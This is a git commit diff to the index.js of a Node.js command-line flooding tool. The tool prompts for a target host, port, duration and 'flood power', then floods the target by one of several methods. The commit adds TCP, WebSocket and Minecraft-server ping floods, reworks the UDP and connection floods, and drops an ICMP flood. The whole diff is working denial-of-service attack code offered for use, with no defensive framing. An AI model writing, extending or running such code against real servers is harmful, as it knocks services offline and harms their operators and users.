6a9940902a76c38181607404a4705a72e1c87eae
DeweyDv <112590449+DeweyDv@users.noreply.github.com>
2023-02-16 16:28:53 +0100

    Update index.js

--- index.js
+++ index.js
@@ -2,12 +2,14 @@ const request = require('request');
 const net = require('net');
 const ICMP = require('ping');
 const dgram = require('dgram');
-const readline = require('readline').createInterface({input: process.stdin,output: process.stdout});
+const WebSocket = require('ws');
+const mc = require('minecraft-protocol');
+const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout });
 
-readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method: ', (method_input) => {
+readline.question('Layer7: GET, WS \nLayer4: CNC, UDP, TCP \nLayer3: MCP \nEnter method: ', (method_input) => {
     if (method_input == 'GET') {
         readline.question('URL: ', (url) => {
-            readline.question('Packet Size (MB): ', (size) => {
+            readline.question('Packet Size (megabytes): ', (size) => {
                 readline.question('Time (seconds): ', (time) => {
                     readline.question('Multi requests: ', (requests) => {
                         const send_packets = setInterval(() => {
@@ -26,59 +28,104 @@ readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method:
         readline.question('Host: ', (host) => {
             readline.question('Port: ', (port) => {
                 readline.question('Time to build (seconds): ', (build_time) => {
-                    const connector = setInterval(() => {
-                        net.createConnection({ host, port });
-                    }, 10);
-                    setTimeout(() => {
-                        clearInterval(connector)
-                    }, build_time * 1000)
-                });
-            });
-        });
-    } else if (method_input == 'ICMP') {
-        readline.question('Host: ', (host) => {
-            readline.question('Multi Ping: ', (multi) => {
-                readline.question('Time (seconds): ', (time) => {
-                    const icmp_sender = setInterval(() => {
-                        for (let i = 0; i < multi; i++) {
-                            ICMP.sys.probe(host, function (isAlive) {
-                                if (!isAlive) {
-                                    console.log('Host is down.');
-                                    process.exit(0)
-                                }
-                            });
-                        }
-                    }, 0)
-                    setTimeout(() => {
-                        clearInterval(icmp_sender)
-                    }, time * 1000)
+                    readline.question('Flood Powrr (miliseconds): ', (power) => {
+                        const connector = setInterval(() => {
+                            net.createConnection({ host, port });
+                        }, power);
+                        setTimeout(() => {
+                            clearInterval(connector)
+                        }, build_time * 1000)
+                    });
                 });
             });
         });
     } else if (method_input == 'UDP') {
         readline.question('Host: ', (host) => {
             readline.question('Port: ', (port) => {
-                readline.question('Packet Size (MB): ', (size) => {
-
-                    readline.question('Time: ', (time) => {
-                        const udp_sender = setInterval(() => {
-                            const x = dgram.createSocket('udp4');
-                            const y = Buffer.alloc(size / 2 * 1024 * 1024, '01');
-                            x.send(y, 0, y.length, port, host, (error) => {
-                                if (error) {
-                                    console.error(error);
-                                }
-                                x.close();
+                readline.question('Packet Size (megabytes): ', (size) => {
+                    if (size > 0.1) console.log('The maximum package size can be only 0.1 MB.') & process.exit(0);
+                    readline.question('Packet Delay (miliseconds): ', (delay) => {
+                        readline.question('Multi Packets: ', (multi) => {
+                            readline.question('Time (seconds): ', (time) => {
+                                const udp_sender = setInterval(() => {
+                                    for (let i = 0; i < multi; i++) {
+                                        const x = dgram.createSocket('udp4');
+                                        const y_BytesNode = Buffer.alloc(size * 1024 * 1024 / 2, '01');
+                                        x.send(y_BytesNode, 0, y_BytesNode.length, port, host, (error) => {
+                                            if (error) {
+                                                console.error(error);
+                                            }
+                                            x.close();
+                                        });
+                                    }
+                                }, delay)
+                                setTimeout(() => {
+                                    clearInterval(udp_sender)
+                                }, time * 1000)
                             });
-                        }, 0)
+                        });
+                    });
+                });
+            });
+        });
+    } else if (method_input == 'TCP') {
+        readline.question('Host: ', (host) => {
+            readline.question('Port: ', (port) => {
+                readline.question('Time (seconds): ', (time) => {
+                    readline.question('Packet Size (MB): ', (size) => {
+                        readline.question('Flood Power (miliseconds): ', (power) => {
+                            const send_packets = setInterval(() => {
+                                const client = new net.Socket();
+                                client.connect(port, host, function () {
+                                    client.write(Buffer.alloc(size * 1024 * 1024 / 2, '01'));
+                                });
+                            }, power)
+                            setTimeout(() => {
+                                clearInterval(send_packets)
+                            }, time * 1000)
+                        });
+                    });
+                });
+            });
+        });
+    } else if (method_input == 'WS') {
+        readline.question('Host (wss://example.com): ', (host) => {
+            readline.question('Emit Packet: ', (packet_type_payload) => {
+                readline.question('Flood Power (miliseconds): ', (power) => {
+                    readline.question('Time (seconds): ', (time) => {
+                        const tcp_createCon = setInterval(() => {
+                            const tcp_tun = new WebSocket(host);
+                            tcp_tun.on('open', () => {
+                                tcp_tun.send(packet_type_payload);
+                                tcp_tun.close();
+                            });
+                        }, power)
                         setTimeout(() => {
-                            clearInterval(udp_sender)
+                            clearInterval(tcp_createCon)
                         }, time * 1000)
                     });
                 });
-
+            });
         });
-    });
+    } else if (method_input == 'MCP') {
+        readline.question('Host (1.1.1.1): ', (host) => {
+            readline.question('Port: ', (port) => {
+                readline.question('Time (seconds): ', (time) => {
+                    readline.question('Workers: ', (workers) => {
+                        readline.question('Flood Power (miliseconds): ', (power) => {
+                            const mc_createCon = setInterval(() => {
+                                for (let i = 0; i < workers; i++) {
+                                    mc.ping({ host: host, port: port });
+                                }
+                            }, power)
+                            setTimeout(() => {
+                                clearInterval(mc_createCon)
+                            }, time * 1000)
+                        });
+                    });
+                });
+            });
+        });
     } else {
         console.log('Invalid method!')
     }
